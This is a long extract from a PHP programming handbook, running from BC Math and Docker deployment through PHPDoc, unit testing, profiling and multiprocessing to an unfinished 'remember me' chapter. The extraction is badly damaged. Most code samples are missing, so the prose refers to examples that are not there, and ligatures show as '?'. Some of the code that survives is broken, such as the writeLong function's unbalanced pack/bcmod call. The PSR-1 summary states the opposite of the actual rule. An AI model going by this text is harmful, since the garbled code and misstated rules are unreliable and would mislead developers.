echo "socket read error: ".socket_strerror(socket_last_error($msgsock)) . "\n";



Chapter 84: BC Math (Binary Calculator)
bcadd	Add two arbitrary precision numbers.
left_operand The left operand, as a string.
right_operand The right operand, as a string.
scale	A optional parameter to set the number of digits after the decimal place in the result.
bccomp	Compare two arbitrary precision numbers. left_operand The left operand, as a string. right_operand The right operand, as a string.
scale	A optional parameter to set the number of digits after the decimal place which will be used in the comparison.
bcdiv	Divide two arbitrary precision numbers. left_operand The left operand, as a string. right_operand The right operand, as a string.
scale	A optional parameter to set the number of digits after the decimal place in the result.
bcmod	Get modulus of an arbitrary precision number.
left_operand The left operand, as a string.
modulus	The modulus, as a string.
bcmul	Multiply two arbitrary precision numbers. left_operand The left operand, as a string. right_operand The right operand, as a string.
scale	A optional parameter to set the number of digits after the decimal place in the result.
bcpow	Raise an arbitrary precision number to another.
left_operand The left operand, as a string.
right_operand The right operand, as a string.
scale	A optional parameter to set the number of digits after the decimal place in the result. bcpowmod	Raise an arbitrary precision number to another, reduced by a speci?ed modulus. left_operand The left operand, as a string.
right_operand The right operand, as a string.
modulus	The modulus, as a string.
scale	A optional parameter to set the number of digits after the decimal place in the result.
bcscale	Set default scale parameter for all bc math functions.
scale	The scale factor.
bcsqrt	Get the square root of an arbitrary precision number.
operand	The operand, as a string.
scale	A optional parameter to set the number of digits after the decimal place in the result.
bcsub	Subtract one arbitrary precision number from another.
left_operand The left operand, as a string.
right_operand The right operand, as a string.
scale	A optional parameter to set the number of digits after the decimal place in the result.

The Binary Calculator can be used to calculate with numbers of any size and precision up to 2147483647-1 decimals, in string format. The Binary Calculator is more precise than the ?oat calculation of PHP.
Section 84.1: Using bcmath to read/write a binary long on 32-

bit system
On 32-bit systems, integers greater than 0x7FFFFFFF cannot be stored primitively, while integers between 0x0000000080000000 and 0x7FFFFFFFFFFFFFFF can be stored primitively on 64-bit systems but not 32-bit systems (signed long long). However, since 64-bit systems and many other languages support storing signed long long integers, it is sometimes necessary to store this range of integers in exact value. There are several ways to do so, such as creating an array with two numbers, or converting the integer into its decimal human-readable form. This has several advantages, such as the convenience in presenting to the user, and the ability to manipulate it with bcmath directly.
The pack/unpack methods can be used to convert between binary bytes and decimal form of the numbers (both of type string, but one is binary and one is ASCII), but they will always try to cast the ASCII string into a 32-bit int on 32-bit systems. The following snippet provides an alternative:

/** Use pack("J") or pack("p") for 64-bit systems */
function writeLong(string $ascii) : string { if(bccomp($ascii, "0") === -1) { // if $ascii < 0
// 18446744073709551616 is equal to (1 << 64)
// remember to add the quotes, or the number will be parsed as a float literal
$ascii = bcadd($ascii, "18446744073709551616");
}

// "n" is big-endian 16-bit unsigned short. Use "v" for small-endian.
return pack("n", bcmod(bcdiv($ascii, "281474976710656"), "65536")) .
pack("n", bcmod(bcdiv($ascii, "4294967296"), "65536")) .
pack("n", bcdiv($ascii, "65536"), "65536")) .
pack("n", bcmod($ascii, "65536"));
}

function readLong(string $binary) : string {
$result
=
"0";

$result
=
bcadd($result,
unpack("n",
substr($binary,
0,
2)));
$result
=
bcmul($result,
"65536");



$result
=
bcadd($result,
unpack("n",
substr($binary,
2,
2)));
$result
=
bcmul($result,
"65536");



$result
=
bcadd($result,
unpack("n",
substr($binary,
4,
2)));
$result
=
bcmul($result,
"65536");



$result
=
bcadd($result,
unpack("n",
substr($binary,
6,
2)));
// if $binary is a signed long long
    // 9223372036854775808 is equal to (1 << 63) (note that this expression actually does not work even on 64-bit systems)
if(bccomp($result, "9223372036854775808") !== -1) { // if $result >= 9223372036854775807
$result = bcsub($result, "18446744073709551616"); // $result -= (1 << 64)
}
return $result;
}

Section 84.2: Comparison between BCMath and ?oat arithmetic operations
bcadd vs ?oat+?oat
bcsub vs ?oat-?oat


bcmul vs int*int
bcmul vs ?oat*?oat

bcdiv vs ?oat/?oat

Chapter 85: Docker deployment
Docker is a very popular container solution being used widely for deploying code in production environments. It makes it easier to Manage and Scale web-applications and microservices.
Section 85.1: Get docker image for php
In order to deploy the application on docker, ?rst we need to get the image from registry.


This will get you the latest version of image from o?cial php repository. Generally speaking, PHP is usually used to deploy web-applications so we need an http server to go with the image. php:7.0-apache image comes pre- installed with apache to make deployment hastle free.
Section 85.2: Writing docker?le
Dockerfile is used to con?gure the custom image that we will be building with the web-application codes. Create a new ?le Dockerfile in the root folder of project and then put the following contents in the same


The ?rst line is pretty straight forward and is used to describe which image should be used to build out new image. The same could be changed to any other speci?c version of PHP from the registry.
Second line is simply to upload php.ini ?le to our image. You can always change that ?le to some other custom ?le location.

The third line would copy the codes in current directory to /var/www/html which is our webroot. Remember
/var/www/html inside the image.

The last line would simply open up port 80 inside the docker container.

Ignoring ?les

In some instances there might be some ?les that you don't want on server like environment con?guration etc. Let us assume that we have our environment in .env. Now in order to ignore this ?le, we can simply add it to
.dockerignore in the root folder of our codebase.
Section 85.3: Building image
Building image is not something speci?c to php, but in order to build the image that we described above, we can simply use


Once the image is built, you can verify the same using


Which would list out all the images installed in your system.

Section 85.4: Starting application container
Once we have an image ready, we can start and serve the same. In order to create a container from the image, use


In the command above -p 80:80 would forward port 80 of your server to port 80 of the container. The ?ag -d tells that the container should run as background job. The ?nal speci?es which image should be used to build the container.

Checking container

In order to check running containers, simply use


This will list out all the containers running on docker daemon.

Application logs

Logs are very important to debug the application. In order to check on them use


Chapter 86: APCu
APCu is a shared memory key-value store for PHP. The memory is shared between PHP-FPM processes of the same pool. Stored data persists between requests.
Section 86.1: Iterating over Entries
The APCUIterator allows to iterate over entries in the cache:


The iterator can be initialized with an optional regular expression to select only entries with matching keys:


Information about a single cache entry can be obtained via:


Section 86.2: Simple storage and retrieval
apcu_store can be used to store, apcu_fetch to retrieve values:


Section 86.3: Store information
apcu_cache_info provides information about the store and its entries:



Note that invoking apcu_cache_info() without limit will return the complete data currently stored. To only get the meta data, use apcu_cache_info(true).
To get information about certain cache entries better use APCUIterator.

Chapter 87: PHP Built in server
Column	Column
-S	Tell the php that we want a webserver
<hostname>:<port> The host name and the por to be used
-t	Public directory
<?lename>	The routing script

Learn how to use the built in server to develop and test your application without the need of other tools like xamp, wamp, etc.
Section 87.1: Running the built in server

php -S localhost:80


PHP 7.1.7 Development Server started at Fri Jul 14 15:11:05 2017 Listening on http://localhost:80
Document root is C:\projetos\repgeral Press Ctrl-C to quit.

This is the simplest way to start a PHP server that responds to request made to localhost at the port 80. The -S tells that we are starting a webserver.
The localhost:80 indicates the host that we are answering and the port. You can use other combinations like:

mymachine:80 - will listen on the address mymachine and port 80; 127.0.0.1:8080 - will listen on the address 127.0.0.1 and port 8080;

Section 87.2: built in server with speci?c directory and router script

php -S localhost:80 -t project/public router.php


PHP 7.1.7 Development Server started at Fri Jul 14 15:22:25 2017 Listening on http://localhost:80
Document root is /home/project/public Press Ctrl-C to quit.

Chapter 88: PSR
The PSR (PHP Standards Recommendation) is a series of recommendations put together by the FIG (Framework Interop Group).
"The idea behind the group is for project representatives to talk about the commonalities between our projects and ?nd ways we can work together" - FIG FAQ
PSRs can be in the following states: Accepted, Review, Draft or Deprecated.

Section 88.1: PSR-4: Autoloader
PSR-4 is an accepted recommendation that outlines the standard for autoloading classes via ?lenames. This recommendation is recommended as the alternative to the earlier (and now deprecated) PSR-0.

The fully quali?ed class name should match the following requirement:


It MUST contain a top level vendor namespace (E.g.: Alphabet)
It MAY contain one or more sub-namespaces (E.g.: Google\AdWord) It MUST contain an ending class name (E.g.: KeywordPlanner)
Thus the ?nal class name would be Alphabet\Google\AdWord\KeywordPlanner. The fully quali?ed class name should also translate into a meaningful ?le path therefore Alphabet\Google\AdWord\KeywordPlanner would be located in [path_to_source]/Alphabet/Google/AdWord/KeywordPlanner.php

Starting with PHP 5.3.0, a custom autoloader function can be de?ned to load ?les based on the path and ?lename pattern that you de?ne.


Replacing the location ('classes/') and ?lename extension ('.class.php') with values that apply to your structure.

Composer package manager supports PSR-4 which means, if you follow the standard, you can load your classes in your project automatically using Composer's vendor autoloader.


Regenerate the autoloader ?le


Now in your code you can do the following:




Section 88.2: PSR-1: Basic Coding Standard
PSR-1 is an accepted recommendation and outlines a basic standard recommendation for how code should be written.

It outlines naming convetions for classes, methods and constants. It makes adopting PSR-0 or PSR-4 recommendations a requirement. It indicates which PHP tags to use: <?php and <?= but not <?.
It speci?es what ?le encoding to use (UTF8).
It also states that ?les should either declare new symbols (classes, functions, constants, etc.) and cause no other side e?ects, or execute logic with side e?ects and not de?ne symbols, but do both.

Chapter 89: PHPDoc
Section 89.1: Describing a variable
The @var keyword can be used to describe the type and usage of: a class property
a local or global variable a class or global constant


The type can be one of the built-in PHP types, or a user-de?ned class, including namespaces.

The name of the variable should be included, but can be omitted if the docblock applies to only one item.

Section 89.2: Adding metadata to functions
Function level annotations help IDEs identify return values or potentially dangerous code




Section 89.3: Describing parameters
/**
* Parameters
*
* @param	int	$int
* @param	string  $string
* @param	array	$array
* @param	bool	$bool
*/
function demo_param($int, $string, $array, $bool)
{
}

/**
* Parameters - Optional / Defaults
* 
* @param	int	$int
* @param	string  $string
* @param	array	$array
* @param	bool	$bool
*/
function demo_param_optional($int = 5, $string = 'foo', $array = [], $bool = false)
{
}

/**
* Parameters - Arrays
* 
* @param array	$mixed
* @param int[]	$integers
* @param string[]	$strings
* @param bool[]	$bools
* @param string[]|int[] $strings_or_integers
*/
function demo_param_arrays($mixed,$integers, $strings, $bools, $strings_or_integers)
{
}

/**
* Parameters - Complex
* @param array $config
* <pre>
* $params = [
* 'hostname'	=> (string) DB hostname. Required.
* 'database'	=> (string) DB name. Required.
* 'username'	=> (string) DB username. Required.
* ]
* </pre>
*/
function demo_param_complex($config)
{



Section 89.4: Collections
PSR-5 proposes a form of Generics-style notation for collections.

Generics Syntax

Values in a Collection MAY even be another array and even another Collection.

Examples
<?php

/**
* @var  ArrayObject<string>  $name
*/
$name = new ArrayObject(['a', 'b']);

/**
* @var  ArrayObject<int>  $name
*/
$name = new ArrayObject([1, 2]);

/**
* @var ArrayObject<stdClass> $name
*/
$name = new ArrayObject([
new stdClass(),
new stdClass()
]);

/**
* @var  ArrayObject<string|int|stdClass|bool>  $name
*/
$name = new ArrayObject([ 'a',
true, 1, 'b',
new stdClass(), 'c',
2
]);

/**
* @var  ArrayObject<ArrayObject<int>>  $name
*/
$name = new ArrayObject([
new ArrayObject([1, 2]),
new ArrayObject([1, 2])
]);



Section 89.5: Adding metadata to ?les
File level metadata applies to all the code within the ?le and should be placed at the top of the ?le:


Section 89.6: Inheriting metadata from parent structures
If a class extends another class and would use the same metadata, providing it @inheritDoc is a simple way for use the same documentation. If multiple classes inherit from a base, only the base would need to be changed for the children to be a?ected.




Chapter 90: Design Patterns
This topic provides examples of well known design patterns implemented in PHP.

Section 90.1: Method Chaining in PHP
Method Chaining is a technique explained in Martin Fowler's book Domain Speci?c Languages. Method Chaining is summarized as

Makes modi?er methods return the host object, so that multiple modi?ers can be invoked in a single expression.


Consider this non-chaining/regular piece of code (ported to PHP from the aforementioned book)


Method Chaining would allow you to write the above statements in a more compact way:


All you need to do for this to work is to return $this in the methods you want to chain from:


When to use it

The primary use cases for utilizing Method Chaining is when building internal Domain Speci?c Languages. Method Chaining is a building block in Expression Builders and Fluent Interfaces. It is not synonymous with those, though. Method Chaining merely enables those. Quoting Fowler:


I've also noticed a common misconception - many people seem to equate ?uent interfaces with Method Chaining. Certainly chaining is a common technique to use with ?uent interfaces, but true ?uency is much more than that.

With that said, using Method Chaining just for the sake of avoiding writing the host object is considered a code smell by many. It makes for unobvious APIs, especially when mixing with non-chaining APIs.

Additional Notes
Command Query Separation

Command Query Separation is a design principle brought forth by Bertrand Meyer. It states that methods mutating state (commands) should not return anything, whereas methods returning something (queries) should not mutate state. This makes it easier to reason about the system. Method Chaining violates this principle because we are mutating state and returning something.
Getters

When making use of classes which implement method chaining, pay particular attention when calling getter methods (that is, methods which return something other than $this). Since getters must return a value other than
$this, chaining an additional method onto a getter makes the call operate on the gotten value, not on the original
object. While there are some use cases for chained getters, they may make code less readable.

Law of Demeter and impact on testing

Method Chaining as presented above does not violate Law of Demeter. Nor does it impact testing. That is because we are returning the host instance and not some collaborator. It's a common misconception stemming from people confusing mere Method Chaining with Fluent Interfaces and Expression Builders. It is only when Method Chaining returns other objects than the host object that you violate Law of Demeter and end up with Mock fests in your tests.

Chapter 91: Compile PHP Extensions
Section 91.1: Compiling on Linux
To compile a PHP extension in a typical Linux environment, there are a few pre-requisites: Basic Unix skills (being able to operate "make" and a C compiler)
An ANSI C compiler
The source code for the PHP extension you want to compile

Generally there are two ways to compile a PHP extension. You can statically compile the extension into the PHP binary, or compile it as a shared module loaded by your PHP binary at startup. Shared modules are more likely since they allow you to add or remove extensions without rebuilding the entire PHP binary. This example focuses on the shared option.
If you installed PHP via your package manager (apt-get install, yum install, etc..) you will need to install the - dev package for PHP, which will include the necessary PHP header ?les and phpize script for the build environment to work. The package might be named something like php5-dev or php7-dev, but be sure to use your package manager to search for the appropriate name using your distro's repositories. They can di?er.

If you built PHP from source the header ?les most likely already exist on your system (usually in /usr/include or
/usr/local/include).

Steps to compile

After you check to make sure you have all the prerequisites, necessary to compile, in place you can head over to pecl.php.net, select an extension you wish to compile, and download the tar ball.
1. Unpack the tar ball (e.g. tar xfvz yaml-2.0.0RC8.tgz)
2. Enter the directory where the archive was unpacked and run phpize
3. You should now see a newly created .configure script if all went well, run that ./configure
4. Now you will need to run make, which will compile the extension
5. Finally, make install will copy the compiled extension binary to your extension directory

The make install step will typically provide the installation path for you where the extension was copied. This is usually in /usr/lib/, for example it might be something like /usr/lib/php5/20131226/yaml.so. But this depends on your con?guration of PHP (i.e. --with-prefix) and speci?c API version. The API number is included in the path to keep extensions built for di?erent API versions in separate locations.

Loading the Extension in PHP

To load the extension in PHP, ?nd your loaded php.ini ?le for the appropriate SAPI, and add the line
extension=yaml.so then restart PHP. Change yaml.so to the name of the actual extension you installed, of course.

For a Zend extension you do need to provide the full path to the shared object ?le. However, for normal PHP extensions this path derived from the extension_dir directive in your loaded con?guration, or from the $PATH environment during initial setup.

Chapter 92: Common Errors
Section 92.1: Call fetch_assoc on boolean
If you get an error like this:


Other variations include something along the lines of:


These errors mean that there is something wrong with either your query (this is a PHP/MySQL error), or your referencing. The above error was produced by the following code:


In order to "?x" this error, it is recommended to make mysql throw exceptions instead:


This will then throw an exception with this much more helpful message instead:


Another example that would produce a similar error, is where you simply just gave the wrong information to the
mysql_fetch_assoc function or similar:


Section 92.2: Unexpected $end


If you get an error like this (or sometimes unexpected $end, depending on PHP version), you will need to make sure that you've matched up all inverted commas, all parentheses, all curly braces, all brackets, etc.

The following code produced the above error:


Notice the missing curly brace. Also do note that the line number shown for this error is irrelevant - it always shows

the last line of your document.

Chapter 93: Compilation of Errors and Warnings
Section 93.1: Parse error: syntax error, unexpected T_PAAMAYIM_NEKUDOTAYIM
Appearance:

"Paamayim Nekudotayim" means "double colon" in Hebrew; thus this error refers to the inappropriate use of the double colon operator (::). The error is typically caused by an attempt to call a static method that is, in fact, not static.

Possible Solution:


If the above code causes this error, you most likely need to simply change the way you call the method:


The latter example assumes that $classname is an instance of a class, and the doMethod() is not a static method of that class.
Section 93.2: Notice: Unde?ned index
Appearance:

Trying to access an array by a key that does not exist in the array

Possible Solution:

Check the availability before accessing it. Use:

1. isset()
2. array_key_exists()

Section 93.3: Warning: Cannot modify header information - headers already sent
Appearance:

Happens when your script tries to send a HTTP header to the client but there already was output before, which resulted in headers to be already sent to the client.
Possible Causes:

1. Print, echo: Output from print and echo statements will terminate the opportunity to send HTTP headers. The application ?ow must be restructured to avoid that.
2. Raw HTML areas: Unparsed HTML sections in a .php ?le are direct output as well. Script conditions that will trigger a header() call must be noted before any raw blocks.


3. Whitespace before <?php for "script.php line 1" warnings: If the warning refers to output in line 1, then it's mostly leading whitespace, text or HTML before the opening <?php token.


Reference from SO answer by Mario

Chapter 94: Exception Handling and Error Reporting
Section 94.1: Setting error reporting and where to display them
If it's not already done in php.ini, error reporting can be set dynamically and should be set to allow most errors to be shown:
Syntax


Examples


errors will be logged by default by php, normally in a error.log ?le at the same level than the running script.

in development environment, one can also show them on screen:


in production however, one should


and show a friendly problem message through the use of an Exception or Error handler.

Section 94.2: Logging fatal errors
In PHP, a fatal error is a kind of error that cannot be caught, that is, after experiencing a fatal error a program does not resume. However, to log this error or somehow handle the crash you can use register_shutdown_function to register shutdown handler.




Reference:

http://php.net/manual/en/function.register-shutdown-function.php  http://php.net/manual/en/function.error-get-last.php http://php.net/manual/en/errorfunc.constants.php

Chapter 95: Debugging
Section 95.1: Dumping variables
The var_dump function allows you to dump the contents of a variable (type and value) for debugging.

Example:


Output:


Section 95.2: Displaying errors
If you want PHP to display runtime errors on the page, you have to enable display_errors, either in the php.ini or using the ini_set function.
You can choose which errors to display, with the error_reporting (or in the ini) function, which accepts E_*
constants, combined using bitwise operators.

PHP can display errors in text or HTML format, depending on the html_errors setting.

Example:




Plain text output: (HTML format di?ers between implementations)



NOTE: If you have error reporting disabled in php.ini and enable it during runtime, some errors (such as parse errors) won't be displayed, because they occurred before the runtime setting was applied.

The common way to handle error_reporting is to enable it fully with E_ALL constant during the development, and to disable publicly displaying it with display_errors on production stage to hide the internals of your scripts.
Section 95.3: phpinfo()
Warning

It is imperative that phpinfo is only used in a development environment. Never release code containing
phpinfo into a production environment Introduction
Having said that, it can be a useful tool in understanding the PHP environment (OS, con?guration, versions, paths, modules) in which you are working, especially when chasing a bug. It is a simple built in function:


It has one parameter $what that allows the output to be customized. The default is INFO_ALL, causing it to display all information and is commonly used during development to see the current state of PHP.

You can pass the parameter INFO_* constants, combined with bitwise operators to see a customized list.

You can run it in the browser for a nicely formatted detailed look. It also works in PHP CLI, where you can pipe it into less for easier view.
Example

This will display a list of PHP directives (ini_get), environment ($_ENV) and prede?ned variables.
Section 95.4: Xdebug
Xdebug is a PHP extension which provides debugging and pro?ling capabilities. It uses the DBGp debugging protocol.
There are some nice features in this tool: stack traces on errors

maximum nesting level protection and time tracking
helpful replacement of standard var_dump() function for displaying variables
allows to log all function calls, including parameters and return values to a ?le in di?erent formats code coverage analysis
pro?ling information
remote debugging (provides interface for debugger clients that interact with running PHP scripts)

As you can see this extension is perfectly suited for development environment. Especially remote debugging feature can help you to debug your php code without numerous var_dump's and use normal debugging process as in C++ or Java languages.
Usually installing of this extension is very simple:


And activate it into your php.ini:


In more complicated cases see this instructions

When you use this tool you should remember that:
XDebug is not suitable for production environments

Section 95.5: Error Reporting (use them both)


Section 95.6: phpversion()
Introduction

When working with various libraries and their associated requirements, it is often necessary to know the version of current PHP parser or one of it's packages.
This function accepts a single optional parameter in the form of extension name: phpversion('extension'). If the extension in question is installed, the function will return a string containing version value. However, if the extension not installed FALSE will be returned. If the extension name is not provided, the function will return the version of PHP parser itself.

Example

Chapter 96: Unit Testing
Section 96.1: Testing class rules
Let's say, we have a simple LoginForm class with rules() method (used in login page as framework template):

class LoginForm { public $email; public $rememberMe; public $password;

/* rules() method returns an array with what each field has as a requirement.
* Login form uses email and password to authenticate user.
*/
public function rules() { return [
// Email and Password are both required
[['email', 'password'], 'required'],

// Email must be in email format
['email', 'email'],

// rememberMe must be a boolean value
['rememberMe', 'boolean'],

// Password must match this pattern (must contain only letters and numbers)
['password', 'match', 'pattern' => '/^[a-z0-9]+$/i'],
];
}

/** the validate function checks for correctness of the passed rules */
public function validate($rule) {
$success = true; list($var, $type) = $rule;
foreach ((array) $var as $var) { switch ($type) {
case "required":
$success = $success && $this->$var != ""; break;
case "email":
$success = $success && filter_var($this->$var, FILTER_VALIDATE_EMAIL); break;
case "boolean":
                        $success = $success && filter_var($this->$var, FILTER_VALIDATE_BOOLEAN, FILTER_NULL_ON_FAILURE) !== null;
     break; case "match":
$success = $success && preg_match($rule["pattern"], $this->$var); break;
default:
throw new \InvalidArgumentException("Invalid filter type passed")
}
}
return $success;
}
}

In order to perform tests on this class, we use Unit tests (checking source code to see if it ?ts our expectations):

class LoginFormTest extends TestCase {
protected $loginForm;

// Executing code on the start of the test
public function setUp() {
$this->loginForm = new LoginForm;
}

// To validate our rules, we should use the validate() method

/**
* This method belongs to Unit test class LoginFormTest and
* it's testing rules that are described above.
*/
public function testRuleValidation() {
$rules = $this->loginForm->rules();

// Initialize to valid and test this
$this->loginForm->email = "valid@email.com";
$this->loginForm->password = "password";
$this->loginForm->rememberMe = true;
          $this->assertTrue($this->loginForm->validate($rules), "Should be valid as nothing is invalid");

// Test email validation
// Since we made email to be in email format, it cannot be empty
$this->loginForm->email = '';
          $this->assertFalse($this->loginForm->validate($rules), "Email should not be valid (empty)");

// It does not contain "@" in string so it's invalid
$this->loginForm->email = 'invalid.email.com';
          $this->assertFalse($this->loginForm->validate($rules), "Email should not be valid (invalid format)");

// Revert email to valid for next test
$this->loginForm->email = 'valid@email.com';

// Test password validation
// Password cannot be empty (since it's required)
$this->loginForm->password = '';
          $this->assertFalse($this->loginForm->validate($rules), "Password should not be valid (empty)");

// Revert password to valid for next test
$this->loginForm->password = 'ThisIsMyPassword';

// Test rememberMe validation
$this->loginForm->rememberMe = 999;
          $this->assertFalse($this->loginForm->validate($rules), "RememberMe should not be valid (integer type)");

// Revert remeberMe to valid for next test
$this->loginForm->rememberMe = true;
}
}

How exactly Unit tests can help with (excluding general examples) in here? For example, it ?ts very well when we get unexpected results. For example, let's take this rule from earlier:


Instead, if we missed one important thing and wrote this:


With dozens of di?erent rules (assuming we are using not just email and password), it's di?cult to detect mistakes. This unit test:


Will pass our ?rst example but not second. Why? Because in 2nd example we wrote a pattern with a typo (missed +
sign), meaning it only accepts one letter/number.

Unit tests can be run in console with command: phpunit [path_to_file]. If everything is OK, we should be able to see that all tests are in OK state, else we will see either Error (syntax errors) or Fail (at least one line in that method did not pass).

With additional parameters like --coverage we can also see visually how many lines in backend code were tested and which passed/failed. This applies to any framework that has installed PHPUnit.

Example how PHPUnit test looks like in console (general look, not according to this example):



Section 96.2: PHPUnit Data Providers
Test methods often need data to be tested with. To test some methods completely you need to provide di?erent data sets for every possible test condition. Of course, you can do it manually using loops, like this:


And someone can ?nd it convenient. But there are some drawbacks of this approach. First, you'll have to perform additional actions to extract data if your test function accepts several parameters. Second, on failure it would be di?cult to distinguish the failing data set without additional messages and debugging. Third, PHPUnit provides automatic way to deal with test data sets using data providers.
Data provider is a function, that should return data for your particular test case.

A data provider method must be public and either return an array of arrays or an object that implements the Iterator interface and yields an array for each iteration step. For each array that is part of the collection the test method will be called with the contents of the array as its arguments.

To use a data provider with your test, use @dataProvider annotation with the name of data provider function speci?ed:


Array of arrays

Note that dataProviderForTest() returns array of arrays. Each nested array has two elements and they will ?ll necessary parameters for testEquals() one by one. Error like this will be thrown Missing argument 2 for Test::testEquals() if there are not enough elements. PHPUnit will automatically loop through data and run tests:



Each data set can be named for convenience. It will be easier to detect failing data:


Iterators

public function  construct($array) {
$this->array = $array;
}

function rewind() {
return reset($this->array);
}

function current() {
return current($this->array);
}

function key() {
return key($this->array);
}

function next() {
return next($this->array);
}

function valid() {
return key($this->array) !== null;
}
}
...

class Test extends TestCase
{
/**
* @dataProvider dataProviderForTest
*/
public function testEquals($a)
{
$toCompare = 0;

$this->assertEquals($a, $toCompare);
}

public function dataProviderForTest()
{
return new MyIterator([ 'Test 1' => [0],
'Test 2' => [false], 'Test 3' => [null]
]);
}
}

As you can see, simple iterator also works.

Note that even for a single parameter, data provider must return an array [$parameter]


Because if we change our current() method (which actually return data on every iteration) to this:


Or change actual data:



We'll get an error:



Of course, it is not useful to use Iterator object over a simple array. It should implement some speci?c logic for your case.


Generators

It is not explicitly noted and shown in manual, but you can also use a generator as data provider. Note that
Generator class actually implements Iterator interface.

So here's an example of using DirectoryIterator combined with generator:



Note provider yields an array. You'll get an invalid-data-provider warning instead.

Section 96.3: Test exceptions
Let's say you want to test method which throws an exception




You can do that by enclosing the method call into a try/catch block and making assertions on execption object's properties, but more conveniently you can use exception assertion methods. As of PHPUnit 5.2 you have expectX() methods available for asserting exception type, message & code


If you are using earlier version of PHPUnit, method setExpectedException can be used in stead of expectX() methods, but keep in mind that it's deprecated and will be removed in version 6.


Chapter 97: Performance
Section 97.1: Pro?ling with Xdebug
An extension to PHP called Xdebug is available to assist in pro?ling PHP applications, as well as runtime debugging. When running the pro?ler, the output is written to a ?le in a binary format called "cachegrind". Applications are available on each platform to analyze these ?les.
To enable pro?ling, install the extension and adjust php.ini settings. In our example we will run the pro?le optionally based on a request parameter. This allows us to keep settings static and turn on the pro?ler only as needed.


Next use a web client to make a request to your application's URL you wish to pro?le, e.g.


As the page processes it will write to a ?le with a name similar to


Note that it will write one ?le for each PHP request / process that is executed. So, for example, if you wish to analyze a form post, one pro?le will be written for the GET request to display the HTML form. The XDEBUG_PROFILE parameter will need to be passed into the subsequent POST request to analyze the second request which processes the form. Therefore when pro?ling it is sometimes easier to run curl to POST a form directly.
Once written the pro?le cache can be read by an application such as KCachegrind.



This will display information including:

Functions executed
Call time, both itself and inclusive of subsequent function calls Number of times each function is called
Call graphs
Links to source code

Obviously performance tuning is very speci?c to each application's use cases. In general it's good to look for:

Repeated calls to the same function you wouldn't expect to see. For functions that process and query data these could be prime opportunities for your application to cache.
Slow-running functions. Where is the application spending most of its time? the best payo? in performance tuning is focusing on those parts of the application which consume the most time.
Note: Xdebug, and in particular its pro?ling features, are very resource intensive and slow down PHP execution. It is recommended to not run these in a production server environment.
Section 97.2: Memory Usage
PHP's runtime memory limit is set through the INI directive memory_limit. This setting prevents any single

execution of PHP from using up too much memory, exhausting it for other scripts and system software. The memory limit defaults to 128M and can be changed in the php.ini ?le or at runtime. It can be set to have no limit, but this is generally considered bad practice.
The exact memory usage used during runtime can be determined by calling memory_get_usage(). It returns the number of bytes of memory allocated to the currently running script. As of PHP 5.2, it has one optional boolean parameter to get the total allocated system memory, as opposed to the memory that's actively being used by PHP.


Now memory_get_usage gives you memory usage at the moment it is run. Between calls to this function you may allocate and deallocate other things in memory. To get the maximum amount of memory used up to a certain point, call memory_get_peak_usage().


Notice the value will only go up or stay constant.

Section 97.3: Pro?ling with XHProf
XHProf is a PHP pro?ler originally written by Facebook, to provide a more lightweight alternative to XDebug. After installing the xhprof PHP module, pro?ling can be enabled / disabled from PHP code:


The returned array will contain data about the number of calls, CPU time and memory usage of each function that has been accessed inside doSlowOperation().
xhprof_sample_enable()/xhprof_sample_disable() can be used as a more lightweight option that will only log pro?ling information for a fraction of requests (and in a di?erent format).

XHProf has some (mostly undocumented) helper functions to display the data (see example), or you can use other

tools to visualize it (the platform.sh blog has an example).

Chapter 98: Multiprocessing
Section 98.1: Multiprocessing using built-in fork functions
You can use built-in functions to run PHP processes as forks. This is the most simple way to achieve parallel work if you don't need your threads to talk to each other.
This allows you to put time intensive tasks (like uploading a ?le to another server or sending an email) to another thread so your script loads faster and can use multiple cores but be aware that this is not real multithreading and your main thread won't know what the children are up to.
Note that under Windows this will make another command prompt pop up for each fork you start.

master.php


worker.php


Section 98.2: Creating child process using fork
PHP has built in function pcntl_fork for creating child process. pcntl_fork is same as fork in unix. It does not take in any parameters and returns integer which can be used to di?erentiate between parent and child process.
Consider the following code for explanation


As you can see -1 is an error in fork and the child was not created. On creation of child, we have two processes running with separate PID.
Another consideration here is a zombie process or defunct process when parent process ?nishes before child process. To prevent a zombie children process simply add pcntl_wait($status) at the end of parent process.

pnctl_wait suspends execution of parent process until the child process has exited.


It is also worth noting that zombie process can't be killed using SIGKILL signal.
Section 98.3: Inter-Process Communication
Interprocess communication allows programmers to communicate between di?erent processes. For example let us consider we need to write an PHP application that can run bash commands and print the output. We will be using proc_open , which will execute the command and return a resource that we can communicate with. The following code shows a basic implementation that runs pwd in bash from php


proc_open runs bash command with $descriptor as descriptor speci?cations. After that we use is_resource to validate the process. Once done we can start interacting with the child process using $pipes which is generated according to descriptor speci?cations.
After that we can simply use fwrite to write to stdin of child process. In this case pwd followed by carriage return. Finally stream_get_contents is used to read stdout of child process.

Always remember to close the child process by using proc_close() which will terminate the child and return the exit status code.

Chapter 99: Multi Threading Extension
Section 99.1: Getting Started
To start with multi-threading, you would need the pthreads-ext for php, which can be installed by


and adding the entry to php.ini. A simple example:


Section 99.2: Using Pools and Workers

Pooling provides a higher level abstraction of the Worker functionality, including the management of references in the way required by pthreads. From: http://php.net/manual/en/class.pool.php

Pools and workers provide an higher level of control and ease of creating multi-threaded


* The work name wich would be given to every work.
*/
public function  construct(string $workName) {
// The block of code in the constructor of your work,
// would be executed when a work is submitted to your pool.

$this->workName = $workName;
printf("A new work was submitted with the name: %s\n", $workName);
}

public function run() {
// This block of code in, the method, run
// would be called by your worker.
// All the code in this method will be executed in another thread.
$workName = $this->workName;
printf("Work named %s starting...\n", $workName); printf("New random number: %d\n", mt_rand());
}
}

// Create an empty worker for the sake of simplicity.
class AwesomeWorker extends Worker {
public function run() {
// You can put some code in here, which would be executed
// before the Work's are started (the block of code in the `run` method of your Work)
// by the Worker.
/* ... */
}
}

// Create a new Pool Instance.
// The ctor of \Pool accepts two parameters.
// First: The maximum number of workers your pool can create.
// Second: The name of worker class.
$pool = new \Pool(1, \AwesomeWorker::class);

// You need to submit your jobs, rather the instance of
// the objects (works) which extends the \Threaded class.
$pool->submit(new \AwesomeWork("DeadlyWork"));
$pool->submit(new \AwesomeWork("FatalWork"));

// We need to explicitly shutdown the pool, otherwise,
// unexpected things may happen.
// See: http://stackoverflow.com/a/23600861/23602185
$pool->shutdown();

Chapter 100: Secure Remeber Me
I have been searching on this topic for sometime till i found this post https://stackover?ow.com/a/17266448/4535386 from ircmaxell, I think it deserves more exposure.
Section 100.1: "Keep Me Logged In" - the best approach
store the cookie with three parts.


Then, to validate:


Chapter 101: Security
